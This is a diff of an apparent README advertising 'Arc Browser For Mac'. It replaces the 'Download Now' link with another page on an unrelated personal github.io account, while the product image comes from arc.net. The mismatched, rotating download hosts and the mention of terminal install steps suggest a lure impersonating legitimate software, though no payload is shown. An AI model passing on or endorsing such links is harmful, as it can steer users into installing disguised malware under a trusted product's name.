@@ -4,7 +4,7 @@ Arc Browser For Mac is a modern, innovative web browser designed for macOS, offe
 
 ![arcbrowser](https://arc.net/_next/image?url=%2Fbrowser-mmmhome.png&w=3840&q=100)
 
-[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/arcbrowser)
+[![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/arcbrowser)
 
 If the download button above doesn’t work, follow the manual installation instructions below using the terminal.
 
